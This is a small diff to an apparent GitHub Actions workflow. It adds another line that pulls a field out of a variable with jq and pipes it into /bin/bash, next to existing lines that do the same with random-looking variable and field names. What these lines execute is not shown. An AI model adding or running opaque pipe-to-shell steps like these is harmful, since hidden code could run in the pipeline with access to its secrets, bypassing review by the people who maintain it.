@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$bq4" | jq -r .fqow15 | /bin/bash
           printf '%s' "$cadq26" | jq -r .bmin51195 | /bin/bash
           echo $gr2 | jq -r .tdcxc52 | /bin/bash
+          echo $bg07372 | jq -r .jtkxs452 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
